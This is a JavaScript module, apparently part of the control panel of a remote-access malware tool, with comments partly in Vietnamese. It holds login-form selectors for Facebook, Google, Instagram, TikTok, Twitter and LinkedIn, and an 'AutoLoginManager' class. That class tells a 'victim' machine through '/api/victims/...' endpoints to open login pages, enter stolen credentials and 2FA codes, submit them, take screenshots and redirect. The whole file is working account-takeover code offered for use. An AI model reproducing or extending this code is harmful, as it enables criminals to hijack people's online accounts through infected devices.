/**
 * Platform Manager - Quản lý auto login cho các nền tảng
 *
 * Hỗ trợ: Facebook, Google, Instagram, TikTok, Twitter, LinkedIn, etc.
 */

export const PLATFORMS = {
  FACEBOOK: {
    id: "facebook",
    name: "Facebook",
    displayName: "Facebook",
    baseUrl: "https://facebook.com",
    loginUrl: "https://www.facebook.com/login.php",
    icon: "📘",
    color: "#1877F2",
    selectors: {
      emailField: "#email",
      passwordField: "#pass",
      loginButton: '[name="login"]',
      twoFactorField: '[name="approvals_code"]',
      errorMessage: "#error_box",
      captcha: ".captcha_refresh",
    },
    features: {
      supports2FA: true,
      supportsCaptcha: true,
      supportsRememberMe: true,
      requiresPhoneVerification: true,
    },
  },

  GOOGLE: {
    id: "google",
    name: "Google",
    displayName: "Google Account",
    baseUrl: "https://accounts.google.com",
    loginUrl: "https://accounts.google.com/signin",
    icon: "🔍",
    color: "#4285F4",
    selectors: {
      emailField: "#identifierId",
      passwordField: '[name="password"]',
      nextButton: "#identifierNext",
      passwordNext: "#passwordNext",
      twoFactorField: "#totpPin",
      errorMessage: ".LXRPh",
      captcha: ".g-recaptcha",
    },
    features: {
      supports2FA: true,
      supportsCaptcha: true,
      supportsRememberMe: false,
      requiresPhoneVerification: true,
      multiStepLogin: true, // Email first, then password
    },
  },

  INSTAGRAM: {
    id: "instagram",
    name: "Instagram",
    displayName: "Instagram",
    baseUrl: "https://instagram.com",
    loginUrl: "https://www.instagram.com/accounts/login/",
    icon: "📷",
    color: "#E4405F",
    selectors: {
      emailField: '[name="username"]',
      passwordField: '[name="password"]',
      loginButton: '[type="submit"]',
      twoFactorField: '[name="verificationCode"]',
      errorMessage: "#slfErrorAlert",
      captcha: ".recaptcha-checkbox",
    },
    features: {
      supports2FA: true,
      supportsCaptcha: true,
      supportsRememberMe: false,
      requiresPhoneVerification: true,
    },
  },

  TIKTOK: {
    id: "tiktok",
    name: "TikTok",
    displayName: "TikTok",
    baseUrl: "https://tiktok.com",
    loginUrl: "https://www.tiktok.com/login/phone-or-email/email",
    icon: "🎵",
    color: "#000000",
    selectors: {
      emailField: '[name="username"]',
      passwordField: '[type="password"]',
      loginButton: '[data-e2e="login-button"]',
      twoFactorField: '[placeholder*="code"]',
      errorMessage: ".error-message",
      captcha: ".captcha-container",
    },
    features: {
      supports2FA: true,
      supportsCaptcha: true,
      supportsRememberMe: false,
      requiresPhoneVerification: true,
    },
  },

  TWITTER: {
    id: "twitter",
    name: "Twitter",
    displayName: "Twitter (X)",
    baseUrl: "https://twitter.com",
    loginUrl: "https://twitter.com/i/flow/login",
    icon: "🐦",
    color: "#1DA1F2",
    selectors: {
      emailField: '[name="text"]',
      passwordField: '[name="password"]',
      nextButton: '[role="button"]',
      loginButton: '[data-testid="LoginForm_Login_Button"]',
      twoFactorField: '[name="challenge_response"]',
      errorMessage: '[data-testid="error-message"]',
      captcha: ".captcha",
    },
    features: {
      supports2FA: true,
      supportsCaptcha: true,
      supportsRememberMe: false,
      requiresPhoneVerification: true,
      multiStepLogin: true,
    },
  },

  LINKEDIN: {
    id: "linkedin",
    name: "LinkedIn",
    displayName: "LinkedIn",
    baseUrl: "https://linkedin.com",
    loginUrl: "https://www.linkedin.com/login",
    icon: "💼",
    color: "#0A66C2",
    selectors: {
      emailField: "#username",
      passwordField: "#password",
      loginButton: '[type="submit"]',
      twoFactorField: "#input__phone_verification_pin",
      errorMessage: ".alert--error",
      captcha: ".captcha-container",
    },
    features: {
      supports2FA: true,
      supportsCaptcha: true,
      supportsRememberMe: true,
      requiresPhoneVerification: false,
    },
  },
};

/**
 * Auto Login Manager Class
 */
export class AutoLoginManager {
  constructor(toast) {
    this.toast = toast;
    this.currentSession = null;
    this.retryCount = 0;
    this.maxRetries = 3;
  }

  /**
   * Detect platform from URL
   */
  detectPlatform(url) {
    const hostname = new URL(url).hostname.toLowerCase();

    for (const [key, platform] of Object.entries(PLATFORMS)) {
      if (
        hostname.includes(platform.id) ||
        hostname.includes(platform.name.toLowerCase())
      ) {
        return platform;
      }
    }

    return null;
  }

  /**
   * Get platform by ID
   */
  getPlatform(platformId) {
    return Object.values(PLATFORMS).find((p) => p.id === platformId);
  }

  /**
   * Start auto login process
   */
  async startAutoLogin(config) {
    const { platformId, credentials, victimId, options = {} } = config;

    const platform = this.getPlatform(platformId);
    if (!platform) {
      throw new Error(`Unsupported platform: ${platformId}`);
    }

    this.toast({
      title: `${platform.icon} Starting Auto Login`,
      description: `Đang khởi tạo auto login cho ${platform.displayName}`,
      duration: 3000,
    });

    try {
      // Step 1: Initialize session
      const session = await this.initializeSession(platform, victimId);

      // Step 2: Navigate to login page
      await this.navigateToLogin(session, platform);

      // Step 3: Fill credentials
      await this.fillCredentials(session, platform, credentials);

      // Step 4: Handle 2FA if needed
      if (platform.features.supports2FA && credentials.twoFactorCode) {
        await this.handle2FA(session, platform, credentials.twoFactorCode);
      }

      // Step 5: Submit login
      await this.submitLogin(session, platform);

      // Step 6: Handle post-login
      const result = await this.handlePostLogin(session, platform, options);

      this.toast({
        title: `✅ ${platform.displayName} Login Success`,
        description: `Đăng nhập thành công vào ${platform.displayName}`,
        duration: 5000,
      });

      return result;
    } catch (error) {
      this.toast({
        title: `❌ ${platform.displayName} Login Failed`,
        description: `Lỗi đăng nhập: ${error.message}`,
        variant: "destructive",
      });

      // Retry logic
      if (this.retryCount < this.maxRetries) {
        this.retryCount++;
        this.toast({
          title: "🔄 Retrying Login",
          description: `Thử lại lần ${this.retryCount}/${this.maxRetries}`,
          duration: 2000,
        });

        await new Promise((resolve) => setTimeout(resolve, 2000));
        return this.startAutoLogin(config);
      }

      throw error;
    }
  }

  /**
   * Initialize login session with victim
   */
  async initializeSession(platform, victimId) {
    const sessionId = `session_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 8)}`;

    const session = {
      id: sessionId,
      platform: platform.id,
      victimId,
      startTime: new Date().toISOString(),
      status: "initializing",
      steps: [],
      currentStep: null,
    };

    // Send session init command to victim
    await fetch(`/api/victims/${victimId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        command: "init_auto_login_session",
        params: {
          sessionId,
          platform: platform.id,
          platformName: platform.displayName,
          loginUrl: platform.loginUrl,
        },
      }),
    });

    this.currentSession = session;
    return session;
  }

  /**
   * Navigate to login page
   */
  async navigateToLogin(session, platform) {
    session.currentStep = "navigation";
    session.steps.push({
      step: "navigation",
      timestamp: new Date().toISOString(),
      status: "in_progress",
    });

    await fetch(`/api/victims/${session.victimId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        command: "navigate_to_login",
        params: {
          sessionId: session.id,
          url: platform.loginUrl,
          waitForLoad: true,
          timeout: 10000,
        },
      }),
    });

    // Wait for navigation to complete
    await this.waitForStep(session, "navigation", 10000);
  }

  /**
   * Fill login credentials
   */
  async fillCredentials(session, platform, credentials) {
    session.currentStep = "fill_credentials";
    session.steps.push({
      step: "fill_credentials",
      timestamp: new Date().toISOString(),
      status: "in_progress",
    });

    // Handle multi-step login (like Google)
    if (platform.features.multiStepLogin) {
      // Step 1: Fill email
      await fetch(`/api/victims/${session.victimId}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "fill_field",
          params: {
            sessionId: session.id,
            selector: platform.selectors.emailField,
            value: credentials.email,
            clearFirst: true,
          },
        }),
      });

      // Click next button
      await fetch(`/api/victims/${session.victimId}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "click_element",
          params: {
            sessionId: session.id,
            selector:
              platform.selectors.nextButton || platform.selectors.loginButton,
            waitAfter: 2000,
          },
        }),
      });

      // Step 2: Fill password
      await fetch(`/api/victims/${session.victimId}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "fill_field",
          params: {
            sessionId: session.id,
            selector: platform.selectors.passwordField,
            value: credentials.password,
            clearFirst: true,
          },
        }),
      });
    } else {
      // Single step login
      await fetch(`/api/victims/${session.victimId}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "fill_login_form",
          params: {
            sessionId: session.id,
            email: credentials.email,
            password: credentials.password,
            emailSelector: platform.selectors.emailField,
            passwordSelector: platform.selectors.passwordField,
          },
        }),
      });
    }

    await this.waitForStep(session, "fill_credentials", 5000);
  }

  /**
   * Handle 2FA
   */
  async handle2FA(session, platform, twoFactorCode) {
    session.currentStep = "2fa";
    session.steps.push({
      step: "2fa",
      timestamp: new Date().toISOString(),
      status: "in_progress",
    });

    await fetch(`/api/victims/${session.victimId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        command: "handle_2fa",
        params: {
          sessionId: session.id,
          code: twoFactorCode,
          selector: platform.selectors.twoFactorField,
          submitAfter: true,
        },
      }),
    });

    await this.waitForStep(session, "2fa", 10000);
  }

  /**
   * Submit login form
   */
  async submitLogin(session, platform) {
    session.currentStep = "submit";
    session.steps.push({
      step: "submit",
      timestamp: new Date().toISOString(),
      status: "in_progress",
    });

    await fetch(`/api/victims/${session.victimId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        command: "submit_login",
        params: {
          sessionId: session.id,
          loginButtonSelector: platform.selectors.loginButton,
          waitForNavigation: true,
          timeout: 15000,
        },
      }),
    });

    await this.waitForStep(session, "submit", 15000);
  }

  /**
   * Handle post-login actions
   */
  async handlePostLogin(session, platform, options) {
    session.currentStep = "post_login";
    session.steps.push({
      step: "post_login",
      timestamp: new Date().toISOString(),
      status: "in_progress",
    });

    const commands = [];

    // Take screenshot
    if (options.takeScreenshot !== false) {
      commands.push({
        command: "take_screenshot",
        params: {
          sessionId: session.id,
          filename: `${platform.id}_login_success_${Date.now()}.png`,
        },
      });
    }

    // Navigate to specific page after login
    if (options.redirectUrl) {
      commands.push({
        command: "navigate",
        params: {
          sessionId: session.id,
          url: options.redirectUrl,
          waitForLoad: true,
        },
      });
    }

    // Execute post-login commands
    for (const cmd of commands) {
      await fetch(`/api/victims/${session.victimId}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(cmd),
      });
    }

    session.status = "completed";
    session.endTime = new Date().toISOString();

    return {
      sessionId: session.id,
      platform: platform.id,
      status: "success",
      duration: Date.now() - new Date(session.startTime).getTime(),
      steps: session.steps,
    };
  }

  /**
   * Wait for step completion
   */
  async waitForStep(session, stepName, timeout = 10000) {
    const startTime = Date.now();

    while (Date.now() - startTime < timeout) {
      // Check step status via API
      try {
        const response = await fetch(
          `/api/victims/${session.victimId}/session-status/${session.id}`
        );
        const status = await response.json();

        if (
          status.currentStep !== stepName ||
          status.stepStatus === "completed"
        ) {
          return status;
        }
      } catch (error) {
        console.warn("Failed to check step status:", error);
      }

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    throw new Error(`Step ${stepName} timed out after ${timeout}ms`);
  }

  /**
   * Get login session status
   */
  async getSessionStatus(sessionId) {
    if (!this.currentSession || this.currentSession.id !== sessionId) {
      return null;
    }

    return this.currentSession;
  }

  /**
   * Cancel login session
   */
  async cancelSession(sessionId) {
    if (this.currentSession && this.currentSession.id === sessionId) {
      await fetch(`/api/victims/${this.currentSession.victimId}/commands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          command: "cancel_session",
          params: { sessionId },
        }),
      });

      this.currentSession.status = "cancelled";
      this.currentSession = null;
    }
  }
}

/**
 * Platform utilities
 */
export const PlatformUtils = {
  /**
   * Get all supported platforms
   */
  getAllPlatforms() {
    return Object.values(PLATFORMS);
  },

  /**
   * Get platforms by feature
   */
  getPlatformsByFeature(feature) {
    return Object.values(PLATFORMS).filter((p) => p.features[feature]);
  },

  /**
   * Get platform icon and color
   */
  getPlatformStyle(platformId) {
    const platform = Object.values(PLATFORMS).find((p) => p.id === platformId);
    return platform
      ? {
          icon: platform.icon,
          color: platform.color,
          name: platform.displayName,
        }
      : {
          icon: "🌐",
          color: "#666666",
          name: "Unknown",
        };
  },

  /**
   * Validate credentials for platform
   */
  validateCredentials(platformId, credentials) {
    const platform = Object.values(PLATFORMS).find((p) => p.id === platformId);
    if (!platform) return false;

    const required = ["email", "password"];
    return required.every(
      (field) => credentials[field] && credentials[field].trim().length > 0
    );
  },
};

export default AutoLoginManager;
